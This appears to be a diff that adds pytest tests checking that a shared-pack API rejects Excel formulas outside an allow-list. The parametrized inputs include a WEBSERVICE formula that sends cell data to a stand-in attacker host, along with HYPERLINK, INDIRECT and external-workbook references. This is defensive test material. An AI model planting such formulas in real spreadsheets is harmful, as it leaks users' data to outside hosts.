@@ -276,3 +276,28 @@ def test_the_table_refuses_a_bad_status_and_invalid_json(migrated_db, seeded_use
                 " VALUES ('rpk_x', ?, 'n', 1, ?, ?, 't', 't')",
                 (seeded_user["id"], status, body),
             )
+
+
+@pytest.mark.parametrize(
+    "excel_formula",
+    [
+        '=WEBSERVICE("http://attacker.invalid/?d="&ingress)',
+        '=HYPERLINK("http://x.invalid","x")',
+        "=_xlfn.WEBSERVICE(1)",
+        "=ingress*Sheet1!A1",
+        "='[evil.xlsx]Sheet1'!A1",
+        '=INDIRECT("A1")',
+    ],
+)
+def test_stored_excel_formulas_outside_the_allow_list_are_rejected(user_a, excel_formula):
+    # Security review 2026-10-15 #1: packs are shared, so a hostile formula must not be stored.
+    model = copy.deepcopy(KAFKA_MODEL)
+    model["calc"][0]["excelFormula"] = excel_formula
+    response = user_a.post(URL, json=pack_body(models=[model]))
+    assert response.status_code == 422, response.text
+
+
+def test_allow_listed_excel_formulas_are_accepted(user_a):
+    model = copy.deepcopy(KAFKA_MODEL)
+    model["calc"][0]["excelFormula"] = "=_xlfn.CEILING.MATH(ingress*rf/broker_write/0.6)+MAX(rf,1)"
+    assert user_a.post(URL, json=pack_body(models=[model])).status_code == 201
